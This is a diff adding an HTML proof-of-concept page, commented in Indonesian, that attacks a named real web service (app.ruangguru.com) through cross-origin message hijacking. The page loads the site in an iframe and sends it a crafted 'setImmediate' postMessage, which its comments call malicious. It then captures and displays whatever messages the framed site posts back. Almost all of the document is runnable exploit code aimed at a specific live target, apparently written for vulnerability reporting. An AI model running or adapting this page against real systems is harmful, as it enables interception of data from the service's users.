@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Origin Exploit PoC</title>
+    <style>
+        #messageDisplay {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+        }
+        .message-item {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            background-color: #fff;
+            border-radius: 5px;
+        }
+        .message-item h3 {
+            margin: 0 0 5px;
+            font-size: 16px;
+            color: #333;
+        }
+        .message-item pre {
+            margin: 0;
+            padding: 10px;
+            background-color: #f4f4f4;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 13px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>PoC: Exploiting Cross-Origin Message Hijacking</h1>
+    <!-- Iframe untuk memuat domain target -->
+    <iframe src="https://app.ruangguru.com" 
+            id="exploitedIframe" 
+            style="width: 100%; height: 500px; border: 1px solid red;">
+    </iframe>
+
+    <!-- Area untuk menampilkan pesan -->
+    <div id="messageDisplay">
+        <h2>Messages Received</h2>
+    </div>
+    
+    <script>
+        // Fungsi untuk menampilkan pesan di halaman
+        function displayMessage(receivedBy, origin, source, data) {
+            const messageDisplay = document.getElementById('messageDisplay');
+            const messageItem = document.createElement('div');
+            messageItem.className = 'message-item';
+
+            // Membuat detail pesan
+            const details = `
+<h3>Message Details</h3>
+<b>Message received by:</b> ${receivedBy}<br>
+<b>Origin:</b> ${origin}<br>
+<b>Source:</b> ${source}<br>
+<b>Data:</b>
+            `;
+
+            // Menambahkan elemen detail ke elemen pesan
+            messageItem.innerHTML = details;
+
+            // Menambahkan elemen data JSON terformat (jika ada)
+            const pre = document.createElement('pre');
+            pre.textContent = typeof data === 'object' 
+                ? JSON.stringify(data, null, 2) // Format JSON jika data berupa objek
+                : data; // Jika data berupa string atau lainnya
+            messageItem.appendChild(pre);
+
+            // Menambahkan elemen ke halaman
+            messageDisplay.appendChild(messageItem);
+        }
+
+        // Fungsi untuk menangkap dan menampilkan pesan
+        function logMessage(event) {
+            try {
+                const receivedBy = document.location.href;
+                const origin = event.origin;
+                const source = event.source ? "Window" : "Unknown"; // Deteksi sumber pesan
+                const data = event.data;
+
+                // Memastikan pesan berasal dari domain yang diinginkan
+                if (origin === "https://app.ruangguru.com") {
+                    // Menampilkan pesan jika asalnya benar
+                    displayMessage(receivedBy, origin, source, data);
+                }
+
+                console.log("Captured Message Details:");
+                console.log({
+                    receivedBy,
+                    origin,
+                    source,
+                    data,
+                });
+            } catch (error) {
+                const receivedBy = document.location.href;
+                const origin = event.origin;
+                const source = "Cross-origin source";
+                const data = "Error processing message";
+
+                displayMessage(receivedBy, origin, source, data);
+                console.error("Error capturing message:", error);
+            }
+        }
+
+        // Menambahkan pendengar untuk semua pesan yang masuk
+        addEventListener("message", logMessage);
+
+        // Menunggu iframe selesai dimuat
+        document.getElementById("exploitedIframe").onload = function () {
+            const maliciousMessage = `setImmediate$${Math.random()}$4`; // Pesan berbahaya dengan ID acak
+            const targetIframe = document.getElementById("exploitedIframe").contentWindow;
+
+            // Mengirim pesan berbahaya ke iframe target
+            targetIframe.postMessage(maliciousMessage, "https://app.ruangguru.com");
+
+            // Menampilkan log pesan yang dikirim
+            displayMessage(document.location.href, "Local Script", "Local Script", maliciousMessage);
+
+            console.log("Malicious message sent:", maliciousMessage);
+        };
+
+        // Pendengar untuk menangkap respons dari iframe
+        window.addEventListener("message", function (event) {
+            // Memastikan hanya pesan dari domain yang tepat yang diproses
+            if (event.origin === "https://app.ruangguru.com") {
+                const receivedBy = document.location.href;
+                const origin = event.origin;
+                const source = event.source ? "Window" : "Unknown";
+                const data = event.data;
+
+                // Menampilkan pesan respons
+                displayMessage(receivedBy, origin, source, data);
+            }
+        });
+    </script>
+</body>
+</html>
